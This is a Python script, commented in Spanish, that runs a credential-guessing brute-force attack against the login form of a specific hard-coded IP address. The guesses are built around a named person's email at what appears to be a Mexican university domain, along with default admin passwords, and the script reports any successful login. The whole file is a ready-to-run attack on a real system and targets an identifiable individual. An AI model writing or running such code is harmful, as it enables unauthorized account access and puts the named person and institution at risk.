import requests
import sys

class AdvancedLoginBruteForcer:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
    
    def smart_brute_force(self):
        """Fuerza bruta inteligente con manejo de sesión"""
        print("[+] Fuerza bruta inteligente...")
        
        # Primero obtener una sesión válida
        try:
            # Acceder a la página de login para obtener cookies
            login_page = self.session.get(f"{self.target}/jsp/index.jsp")
            print(f"Session obtenida, cookies: {len(self.session.cookies)}")
            
        except Exception as e:
            print(f"Error obteniendo sesión: {e}")
            return None
        
        # Credenciales específicas basadas en el dominio
        credentials = [
            # Basado en el email hnieto@utslp.edu.mx
            ('hnieto', 'utslp'), ('hnieto', 'hnieto'), ('hnieto', 'password'),
            ('hnieto', 'Hnieto123'), ('hnieto', 'Hnieto@123'),
            
            # Usuarios administrativos
            ('admin', 'admin'), ('admin', 'utslp'), ('admin', 'sito'),
            ('administrator', 'admin'), 
            
            # Combinaciones institucionales
            ('sito', 'sito'), ('sito', 'utslp'), ('utslp', 'utslp'),
            
            # Intentar con el email como usuario
            ('hnieto@utslp.edu.mx', 'utslp'),
            ('hnieto@utslp.edu.mx', 'hnieto')
        ]
        
        for username, password in credentials:
            try:
                # Datos del formulario basados en el análisis anterior
                login_data = {
                    'yAccion': 'login',
                    'yUsuario': username,
                    'xUsuario': username, 
                    'xContrasena': password,
                    'yIntentos': '1'
                }
                
                # Enviar POST al login
                response = self.session.post(f"{self.target}/jsp/index.jsp", data=login_data)
                
                # Verificar éxito (basado en cambios en la respuesta)
                if response.status_code == 200:
                    # Indicadores de login exitoso
                    if 'cerrar_sesion.jsp' in response.text or 'Bienvenido' in response.text:
                        print(f"🎉 LOGIN EXITOSO: {username}:{password}")
                        return (username, password)
                    else:
                        print(f"❌ Falló: {username}:{password}")
                        
            except Exception as e:
                print(f"❌ Error: {username}:{password} - {e}")
        
        return None

# Ejecutar
bruteforcer = AdvancedLoginBruteForcer("http://189.254.143.102")
bruteforcer.smart_brute_force()